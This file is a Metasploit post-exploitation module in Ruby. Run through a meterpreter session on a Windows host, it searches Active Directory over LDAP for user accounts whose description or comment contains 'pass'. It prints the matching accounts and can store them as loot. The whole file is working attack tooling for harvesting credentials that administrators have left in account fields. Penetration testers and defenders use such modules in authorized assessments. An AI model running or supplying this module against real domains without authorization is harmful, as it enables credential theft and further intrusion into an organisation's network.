##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'rex'
require 'msf/core'

class Metasploit3 < Msf::Post

  include Msf::Auxiliary::Report
  include Msf::Post::Windows::LDAP

  def initialize(info={})
    super( update_info( info,
        'Name'	       => 'Windows Gather Active Directory User Comments',
        'Description'  => %Q{
          This module will enumerate user accounts in the default AD directory. Which
        contain 'pass' in their description or comment (case-insensitive) by default.
        },
        'License'      => MSF_LICENSE,
        'Author'       => [ 'Ben Campbell <eat_meatballs[at]hotmail.co.uk>' ],
        'Platform'     => [ 'win' ],
        'SessionTypes' => [ 'meterpreter' ],
        'References'	=>
        [
          ['URL', 'http://social.technet.microsoft.com/wiki/contents/articles/5392.active-directory-ldap-syntax-filters.aspx'],
        ]
      ))

    register_options([
      OptBool.new('STORE_LOOT', [true, 'Store file in loot.', false]),
      OptString.new('FIELDS', [true, 'Fields to retrieve.','sAMAccountName,userAccountControl,comment,description']),
      OptString.new('FILTER', [true, 'Search filter.','(&(&(objectCategory=person)(objectClass=user))(|(description=*pass*)(comment=*pass*)))']),
    ], self.class)
  end

  def run
    fields = datastore['FIELDS'].gsub(/\s+/,"").split(',')
    search_filter = datastore['FILTER']
    max_search = datastore['MAX_SEARCH']

    begin
      q = query(search_filter, max_search, fields)
      if q.nil? or q[:results].empty?
        return
      end
    rescue RuntimeError => e
      print_error(e.message)
      return
    end

    # Results table holds raw string data
    results_table = Rex::Ui::Text::Table.new(
        'Header'     => "Domain Users",
        'Indent'     => 1,
        'SortIndex'  => -1,
        'Columns'    => fields
      )

    q[:results].each do |result|
      row = []

      report = {}
      result.each do |field|
        if field.nil?
          row << ""
        else
          row << field
        end
      end

      results_table << row
    end

    print_line results_table.to_s

    if datastore['STORE_LOOT']
      stored_path = store_loot('ad.users', 'text/plain', session, results_table.to_csv)
      print_status("Results saved to: #{stored_path}")
    end
  end

end

